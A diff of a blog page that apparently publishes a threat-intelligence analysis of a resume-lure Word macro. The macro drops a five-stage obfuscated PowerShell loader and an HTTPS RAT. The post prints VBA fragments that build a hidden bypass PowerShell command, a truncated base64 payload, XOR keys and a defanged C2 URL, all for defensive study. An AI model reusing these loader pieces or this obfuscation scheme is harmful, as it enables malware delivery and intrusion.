@@ -12,30 +12,32 @@
         <meta name="author" content="V0lundr">
       
       
-        <link rel="canonical" href="https://v0lundr.github.io/blog/">
+        <link rel="canonical" href="https://v0lundr.github.io/blog/a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/">
       
+      
+        <link rel="prev" href="../arabic-vba-reverse-shell/">
       
       
       
         
       
       
-        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../feed_rss_created.xml">
-        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../feed_rss_updated.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Blog - V0lundr</title>
+        <title>A Five-Stage PowerShell HTTP RAT Hidden Behind an Employee Resume Lure - V0lundr</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -54,9 +56,9 @@
       
     
     
-      <link rel="stylesheet" href="../stylesheets/extra.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -79,7 +81,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#blog" class="md-skip">
+        <a href="#a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure" class="md-skip">
           Skip to content
         </a>
       
@@ -338,7 +340,7 @@
   
   
     <li class="md-tabs__item">
-      <a href=".." class="md-tabs__link">
+      <a href="../.." class="md-tabs__link">
         
   
   
@@ -357,7 +359,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../about/" class="md-tabs__link">
+      <a href="../../about/" class="md-tabs__link">
         
   
   
@@ -381,7 +383,9 @@
           
             
               
-              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
                     
@@ -392,7 +396,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="V0lundr" class="md-nav__button md-logo" aria-label="V0lundr" data-md-component="logo">
+    <a href="../.." title="V0lundr" class="md-nav__button md-logo" aria-label="V0lundr" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -410,7 +414,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -437,7 +441,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../about/" class="md-nav__link">
+      <a href="../../about/" class="md-nav__link">
         
   
   
@@ -465,6 +469,8 @@
             
             
               
+                
+              
               <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
@@ -479,6 +485,313 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-highlights" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Highlights
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resume-themed-docm-lure-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resume-Themed DOCM Lure Analysis
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Resume-Themed DOCM Lure Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lure-design-and-targeting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lure Design and Targeting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delivery-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Delivery Mechanism
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#five-stage-powershell-loader-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Five-Stage PowerShell Loader Analysis
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Five-Stage PowerShell Loader Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stage-by-stage-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stage-by-Stage Analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anti-analysis-anti-debugging-and-vm-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Anti-Analysis, Anti-Debugging and VM Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Persistence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#https-rat-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTPS RAT Capabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection and Mitigation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection and Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#prevention-and-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prevention and Hardening
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#host-based-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Host-Based Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-based-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network-Based Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-hunting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Hunting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#indicators-of-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-efforts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Efforts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Efforts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-gaps-and-recommended-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Gaps and Recommended Rules
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-1-script-interpreter-executing-from-temp-or-public-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 1 - Script Interpreter Executing from Temp or Public Path
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-2-conhostexe-spawned-with-a-secondary-executable-argument" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 2 - conhost.exe Spawned with a Secondary Executable Argument
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-3-scheduled-task-masquerading-as-microsoft-edge-update" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 3 - Scheduled Task Masquerading as Microsoft Edge Update
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-4-microsoft-office-application-writing-a-script-or-executable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 4 - Microsoft Office Application Writing a Script or Executable
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-5-powershell-enumerating-analysis-and-virtualization-tooling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 5 - PowerShell Enumerating Analysis and Virtualization Tooling
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-6-script-interpreter-beaconing-to-free-hosting-infrastructure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule 6 - Script Interpreter Beaconing to Free Hosting Infrastructure
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -486,46 +799,93 @@
             
           
           
-  <div class="md-content" data-md-component="content">
-    <div class="md-content__inner">
-      <header class="md-typeset">
-        <h1 id="blog">Blog<a class="headerlink" href="#blog" title="Permanent link">&para;</a></h1>
-      </header>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-05-29 00:00:00+00:00">2026-05-29</time></li>
-        
-        
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://github.com/V0lundr.png" alt="V0lundr">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          V0lundr
+                        
+                      </strong>
+                      <br>
+                      Threat Intelligence Researcher
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2026-05-29 00:00:00+00:00" class="md-ellipsis">2026-05-29</time>
+                      </div>
+                    </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              33 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
           
-          <li class="md-meta__item">
-            
-              33 min read
-            
-          </li>
-        
-        
-      </ul>
-      
+        </div>
+      </div>
     </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/">A Five-Stage PowerShell HTTP RAT Hidden Behind an Employee Resume Lure</a></h2>
-<h3 id="summary"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#summary">Summary</a></h3>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+<h1 id="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure">A Five-Stage PowerShell HTTP RAT Hidden Behind an Employee Resume Lure<a class="headerlink" href="#a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure" title="Permanent link">&para;</a></h1>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
 <p>In May 2026, I came across a macro-enabled Word document, <em>EmployeeResumeForm.docm</em>, hosted on the free-tier provider 42web[.]io and submitted to VirusTotal a few hours after creation. This report explains the document lure's construction, the five-stage PowerShell unwrap that hides its real payload, a scheduled task it installs for persistence, and the small custom HTTPS RAT that ultimately calls home.</p>
-<h3 id="key-highlights"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#key-highlights">Key Highlights</a></h3>
+<h2 id="key-highlights">Key Highlights<a class="headerlink" href="#key-highlights" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
 <p>The initial-access vector is a macro-enabled .docm that reconstructs an encrypted PowerShell loader on disk from a array, then chains five layers of base64 and XOR before the real RAT executes.</p>
@@ -534,22 +894,22 @@
 <p>The implant beacons roughly every 30 seconds (20% jitter, about ±6 seconds) to <code>hxxps://updatepowershellservice[.]42web[.]io/YE97Bw999zB87t1U8i.php,</code> supports four task primitives (cmd, powershell, file upload, file download), and persists through a scheduled task pretending to be a Microsoft Edge update job</p>
 </li>
 </ul>
-<h3 id="resume-themed-docm-lure-analysis"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#resume-themed-docm-lure-analysis">Resume-Themed DOCM Lure Analysis</a></h3>
-<h4 id="lure-design-and-targeting"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#lure-design-and-targeting">Lure Design and Targeting</a></h4>
+<h2 id="resume-themed-docm-lure-analysis">Resume-Themed DOCM Lure Analysis<a class="headerlink" href="#resume-themed-docm-lure-analysis" title="Permanent link">&para;</a></h2>
+<h3 id="lure-design-and-targeting">Lure Design and Targeting<a class="headerlink" href="#lure-design-and-targeting" title="Permanent link">&para;</a></h3>
 <p>The observed file is a 73,837-byte Microsoft Word 2007+ macro-enabled document, served from <code>hxxps://dxi24-5wj3s-lsk32-j2o3s-aks3e[.]42web[.]io/EmployeeResumeForm.docm</code> and reached via a mailstat[.]us tracking redirector. The randomised-token subdomain and the mail-tracker URL together suggested the document was distributed by email, although I did not recover the original carrier message.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig01.png" src="images/FiveStage-RAT-Resume-Lure-fig01.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig01.png" src="../images/FiveStage-RAT-Resume-Lure-fig01.png" /></p>
 <p><em>Figure 1: Lure Document Observed during analysis</em></p>
 <p>The lure name, an employee resume <em>form</em>, is unusually specific. Resume themes are most often used to target HR and recruitment staff who routinely open attachments from unknown senders. I considered whether the <em>buildInfo</em> value <em>baesystem</em> in the implant's encrypted config (recovered later in this report) indicates active targeting of BAE Systems' recruitment workflow.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig02.png" src="images/FiveStage-RAT-Resume-Lure-fig02.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig02.png" src="../images/FiveStage-RAT-Resume-Lure-fig02.png" /></p>
 <p><em>Figure 2: Employee Resume Form after Enabling Macro</em></p>
 <p>The document metadata reveals some interesting information. The file lists Mighty Spider as both the <em>Creator</em> and <em>Last Modified By</em>, with Microsoft Office Word as the originating application and <em>Normal.dotm</em> as the template - the same handle in both fields suggests the author did not bother to scrub identifying attributes between revisions. Total edit time is one minute over three revisions, and the file was created at 02:16 UTC and last saved at 02:42 UTC on 20 May 2026, with VirusTotal first-seen at 05:14 UTC the same day - a tight three-hour create-to-submit window consistent with on-demand weaponisation rather than reuse of a stale template.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig03.png" src="images/FiveStage-RAT-Resume-Lure-fig03.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig03.png" src="../images/FiveStage-RAT-Resume-Lure-fig03.png" /></p>
 <p><em>Figure 3: Lure Document Metadata</em></p>
-<h4 id="delivery-mechanism"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#delivery-mechanism">Delivery Mechanism</a></h4>
+<h3 id="delivery-mechanism">Delivery Mechanism<a class="headerlink" href="#delivery-mechanism" title="Permanent link">&para;</a></h3>
 <p>A <em>.docm</em> is an Office Open XML container, which is to say it is a ZIP archive. Unzipping it yields the usual OOXML scaffolding - word/document.xml, [Content_Types].xml, the docProps/ metadata folder - and one binary file that does not fit the XML pattern: word/vbaProject.bin. That single 60 KB blob is where every macro in the document lives.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig04.png" src="images/FiveStage-RAT-Resume-Lure-fig04.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig04.png" src="../images/FiveStage-RAT-Resume-Lure-fig04.png" /></p>
 <p><em>Figure 4: Lure Document Internal Content Container</em></p>
-<p>When Microsoft introduced OOXML in 2007, they kept the older Office binary format (a Compound File Binary, or "OLE structured storage" container) for macro storage and embedded the entire mini-filesystem unchanged inside the ZIP.<sup id="fnref:1"><a class="footnote-ref" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#fn:1">1</a></sup> So, <em>vbaProject.bin</em> is itself a structured archive: a PROJECT stream with project-level metadata, a <em>dir</em> stream listing the modules, and one stream per module (<em>ThisDocument</em> and <em>Module1</em>) each holding the original VBA source.</p>
+<p>When Microsoft introduced OOXML in 2007, they kept the older Office binary format (a Compound File Binary, or "OLE structured storage" container) for macro storage and embedded the entire mini-filesystem unchanged inside the ZIP.<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup> So, <em>vbaProject.bin</em> is itself a structured archive: a PROJECT stream with project-level metadata, a <em>dir</em> stream listing the modules, and one stream per module (<em>ThisDocument</em> and <em>Module1</em>) each holding the original VBA source.</p>
 <p>I decompressed the MS-OVBA block and printed a readable source dump resulting in around 870-line listing of what the .bin file represents.</p>
 <div class="language-vbnet highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span>
@@ -771,7 +1131,7 @@
 <p><em>longCmd = psChunks(0) &amp; psChunks(1) &amp; psChunks(2) &amp; psChunks(3) &amp; psChunks(4) &amp; psChunks(5) &amp; psChunks(6) &amp; psChunks(7) shell.Run longCmd, 0, True</em></p>
 <p><em>psChunks = Array( _ "cmd.exe /c powershell.exe -NoP -exec BYpass -w hIdden -C $rukp = 'JG51bGwgPSAmIHsNCmZ1bmN0aW9uIEludm9rZS1FbnZpcm9ubWVudENoZWNrIHsNCltDbWRsZXRCaW5kaW5nKCldDQpwYXJhbSgNCltzd2l0Y2hdJFF1aWV0LA0KW3N3aXRjaF0kRGV0YWlsZWQNCikNCiR2bVByb2Nlc3NlcyA9IEAoDQondm13YXJldHJheScsDQondmJveHNlcnZpY2UnLA0KJ3Zib3h0cmF5JywNCid2bXNydmMnLA0K...</em></p>
 <p>In short, the document is a self-contained loader. When <em>Document_Open</em> fires, the macro reconstructs an encrypted PowerShell file on disk under a benign Public-folder path, builds a hidden child-process command line in several pieces to avoid linear string matching, and hands execution off to <em>powershell.exe</em>. From that point on the document itself does nothing further malicious - the dropped <em>default.ps1</em> and the scheduled task carry the rest of the operation.</p>
-<h3 id="five-stage-powershell-loader-analysis"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#five-stage-powershell-loader-analysis">Five-Stage PowerShell Loader Analysis</a></h3>
+<h2 id="five-stage-powershell-loader-analysis">Five-Stage PowerShell Loader Analysis<a class="headerlink" href="#five-stage-powershell-loader-analysis" title="Permanent link">&para;</a></h2>
 <p>The macro leaves two artefacts behind, neither of them directly executable. The first is the file <em>C:\Users\Public\Microsoft\default.ps1</em>, whose every line begins with <em>Error:</em> and which, to a casual look, resembles a corrupted log file. The second is the in-memory PowerShell process that <em>cmd.exe</em> spawns, parameterised by the base64-encoded script body inside the <em>$rukp</em> variable on its command line. The file on disk is ciphertext. The script on the command line is the <em>decryptor</em>. The two are designed to fit together only at execution time.</p>
 <p>To recover the malicious behaviour, I peeled away the wrappers in the order the malware itself would peel them. Between the base64 sitting on <em>cmd.exe's</em> command line and the final PowerShell HTTP RAT that beacons to the C2, there are five distinct unwrap operations. Each layer uses one of two primitives - a base64 decode, or an XOR against a mixed key - and each layer's output is the next layer's input:</p>
 <ul>
@@ -809,29 +1169,29 @@
 <p>final HTTP RAT</p>
 </li>
 </ul>
-<h4 id="stage-by-stage-analysis"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#stage-by-stage-analysis">Stage-by-Stage Analysis</a></h4>
+<h3 id="stage-by-stage-analysis">Stage-by-Stage Analysis<a class="headerlink" href="#stage-by-stage-analysis" title="Permanent link">&para;</a></h3>
 <p>The macro hands an eight-chunk concatenated command line to <em>shell.Run</em>, and the -C argument is base64-encoded PowerShell wrapped in a <em>$rukp = '&lt;b64&gt;';</em> iex-style dispatcher. Decoding that base64 produces a ~5,800-byte script with two visible halves: the <em>Invoke-EnvironmentCheck</em> function (the 50+ process anti-analysis routine analysed in the next section) and a <em>Register-ScheduledTask</em> block that installs the recurring four-hour persistence task. Stage 1 is the script that runs <em>once</em>, immediately after macro detonation, and whose sole job is to gate execution and arrange for the rest of the chain to run later.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig05.png" src="images/FiveStage-RAT-Resume-Lure-fig05.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig05.png" src="../images/FiveStage-RAT-Resume-Lure-fig05.png" /></p>
 <p><em>Figure 5: Partial Representation of the Stage 1</em></p>
 <p>The <em>Register-ScheduledTask</em> call in stage 1 sets the task action's Argument to <em>powershell.exe -NoP -exec BYpass -w hIdden -Enc &lt;base64&gt;</em>.</p>
 <p>Stage 2 is not a payload in its own right - it is a thin trampoline that decodes the next layer at run time, every four hours, for as long as the task persists.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig06.png" src="images/FiveStage-RAT-Resume-Lure-fig06.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig06.png" src="../images/FiveStage-RAT-Resume-Lure-fig06.png" /></p>
 <p><em>Figure 6: Base64 Blob Decoded from Stage 1 $action</em></p>
 <p>Decoding the base64 inside stage 2's <em>$rukp</em> exposes the actual decryption logic. The script reads <em>C:\Users\Public\Microsoft\default.ps1</em> from disk, strips the <em>^\w+:\s</em><em> prefix from every line (the Error: masquerade), base64-decodes the remaining ciphertext, and XORs the result against a 16-byte mixed key derived from a hardcoded </em>key:salt<em> pair </em>E8/LNvsiT2w/IyTlSVyqPQ==:aYcZU4lHrxI=*.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig07.png" src="images/FiveStage-RAT-Resume-Lure-fig07.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig07.png" src="../images/FiveStage-RAT-Resume-Lure-fig07.png" /></p>
 <p><em>Figure 7: Partial Representation of the Stage 3</em></p>
 <p>Running stage 3's logic against the on-disk <em>default.ps1</em> produces 34,069 bytes of plaintext. The mixed-key construction is straightforward: a 16-byte key is XORed byte-by-byte against an 8-byte salt cycled to length 16, which for the dropper's key/salt yields the hex value <em>7a48d2657265e07e56a43db6c01b052f</em>. The resulting plaintext is not yet the RAT but another IEX-style dispatcher, the same pattern that has appeared at every layer above it. By this point the author has used three nested base64 wrappers and one XOR layer to hide a fourth base64 wrapper.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig08.png" src="images/FiveStage-RAT-Resume-Lure-fig08.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig08.png" src="../images/FiveStage-RAT-Resume-Lure-fig08.png" /></p>
 <p><em>Figure 8: Partial Representation of the Stage 4</em></p>
 <p>Decoding stage 4's inner base64 finally yields executable PowerShell that is not itself a wrapper. The output is a ~25 KB script containing <em>Get-UniqueDeviceId</em>, <em>Get-WanIP</em>, <em>Process-TaskCommands</em>, <em>Load-Config</em>, the <em>$gServerURL</em> configuration handle and the <em>Global\SysInfoProject_ mutex</em> initialization. This is the RAT that beacons to the C2.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig09.png" src="images/FiveStage-RAT-Resume-Lure-fig09.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig09.png" src="../images/FiveStage-RAT-Resume-Lure-fig09.png" /></p>
 <p><em>Figure 9: Partial Representation of the Stage 5</em></p>
 <p>The implant's <em>configuration</em>, however, is encrypted inside the stage-5 script using the same XOR-mixed-key construction as the dropper - a different <em>key:salt</em> pair, an extra colon-delimited ciphertext field, and a separate mixed key (hex 1341c5c2cb57fc169984487a5aa1bc89). Decrypting it produces a single JSON object containing the C2 URL <em><code>hxxps://updatepowershellservice.42web[.]io/YE97Bw999zB87t1U8i.php*,</code> the implant's </em>buildInfo<em> tag </em>baesystem<em>, the spoofed </em>Chrome 141 / Edg 141* user agent, the singleton mutex GUID and the sleep parameters.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig10.png" src="images/FiveStage-RAT-Resume-Lure-fig10.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig10.png" src="../images/FiveStage-RAT-Resume-Lure-fig10.png" /></p>
 <p><em>Figure 10: Implant's Configuration</em></p>
